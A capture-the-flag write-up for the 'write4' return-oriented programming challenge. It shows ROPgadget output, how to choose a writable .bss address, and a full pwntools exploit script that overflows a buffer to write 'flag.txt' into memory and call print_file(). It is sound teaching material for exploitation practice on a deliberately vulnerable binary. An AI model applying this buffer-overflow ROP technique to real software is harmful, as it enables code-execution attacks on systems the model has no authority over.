## Write4
### Writeup
#### General Analysis

The challenge for this challenge is that we have to call print_file() with the address of the string “flag.txt” as an argument. However, the string doesn’t exist anywhere already, which means we have to write the string somewhere in memory ourselves via ROP. 

#### Finding Gadgets & Addresses
To perform this, we being by looking for a gadget that could help us write to memory.
```
ROPgadget --binary=./write4 | grep mov | grep '\[' | grep ret
0x00000000004005e2 : mov byte ptr [rip + 0x200a4f], 1 ; pop rbp ; ret
0x0000000000400629 : mov dword ptr [rsi], edi ; ret
0x0000000000400628 : mov qword ptr [r14], r15 ; ret
``` 
We have 2 real options here to write into memory, being move dword and mov qword (dword is 4 bytes, qword is 8). Either option can be used to solve the challenge, but I chose mov qword as our string is conveniently 8 bytes long, simplifying the exploit. Choosing this gadget also means that I also need gadgets to manipulate the contents of %r14 and %r15 – luckily there is a very good one: 

> 0x00400690 : pop r14 ; pop r15 ; ret

Next, we need an address of a safely writable section that can store our needed string. We can obtain this by running readelf -S ./write4 and choosing any section that includes the write flag (W). I chose 0x601038, which is in the \..bss section.

The last part we need, is a gadget to manipulate arg 1 (%rdi). Luckily there is a pop rdi; ret gadget available.

#### Building Payload
Now that we have all the pieces, we need to put them together in the right way. First we are going to load the string into %r15, and put the writable address into %r14, then write the string it into that address. Then we load that same address into %rdi and then call print_file()

### Exploit
```
#! /bin/env python3
from pwn import *; 
print(f"[\033[95m\033[1m*\033[0m] \033[95m\033[1mSTARTING EXPLOIT\033[0m")

context.log_level = "info"
elf = context.binary = ELF("./write4")
libelf = ELF("./libwrite4.so")
p = elf.process()

writable_address = 0x601038
pop_r14_r15 = 0x0000000000400690 # pop r14 ; pop r15 ; ret
data_into_address = 0x0000000000400628 # mov qword ptr [r14], r15 ; ret
load_arg1 = 0x0000000000400693 # pop rdi ; ret
string = int.from_bytes(b"flag.txt", "little")
print_file = 0x00400510

payload = flat(
        b"A" * 40, 
        pop_r14_r15, 
        writable_address,
        string,
        data_into_address,
        load_arg1,
        writable_address,
        print_file
)

p.recvuntil(b"> ")
p.sendline(payload)
flag = [w for w in p.recvall().split() if w.startswith(b"ROPE{")][0].decode()
print(f"[\033[92m*\033[0m] flag: \033[105m\033[97m{flag}\033[0m")
```